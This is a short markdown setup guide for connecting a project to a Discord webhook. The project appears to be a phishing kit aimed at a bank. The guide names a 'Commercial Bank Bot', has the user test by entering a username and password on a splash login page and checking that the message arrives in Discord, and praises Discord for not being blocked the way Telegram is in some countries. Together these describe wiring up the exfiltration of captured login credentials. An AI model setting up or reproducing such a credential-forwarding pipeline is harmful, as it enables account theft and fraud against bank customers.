# How to Set Up Discord Webhook

## Step 1: Create Discord Webhook

1. **Open Discord** (desktop app or web)
2. **Go to your server** (or create a new one)
3. **Click server name** → **Server Settings**
4. **Click "Integrations"** in the left menu
5. **Click "Webhooks"**
6. **Click "New Webhook"**
7. **Give it a name** (e.g., "Commercial Bank Bot")
8. **Choose a channel** where messages will be sent
9. **Click "Copy Webhook URL"**
10. **Save the URL** - you'll need it!

## Step 2: Configure Your Project

### Option A: Update discord-config.js (Recommended)

1. Open `discord-config.js`
2. Find this line:
   ```javascript
   WEBHOOK_URL: 'YOUR_DISCORD_WEBHOOK_URL_HERE'
   ```
3. Replace with your webhook URL:
   ```javascript
   WEBHOOK_URL: 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN'
   ```
4. Save the file

### Option B: Update api/discord.js (For Server)

1. Open `api/discord.js`
2. Find the `DISCORD_CONFIG` section
3. Update the `WEBHOOK_URL` with your webhook URL
4. Save the file

## Step 3: Test

1. **Restart your server** (if running locally):
   ```bash
   # Stop server (Ctrl+C)
   start-server.bat
   ```

2. **Open your website**: `http://localhost:8000/splash.html`

3. **Test login** - enter username and password

4. **Check Discord** - you should see the message in your Discord channel! ✅

## Webhook URL Format

Your webhook URL looks like this:
```
https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

## Security Note

⚠️ **Keep your webhook URL secret!** Anyone with the URL can send messages to your Discord channel.

## Troubleshooting

- **Not receiving messages?** Check that the webhook URL is correct
- **Server error?** Make sure the URL is in quotes: `'https://...'`
- **Still not working?** Check the server console for error messages

## Benefits of Discord

✅ Usually not blocked (unlike Telegram in some countries)
✅ Easy to set up
✅ Free
✅ Real-time notifications
✅ Can see messages in Discord app or web
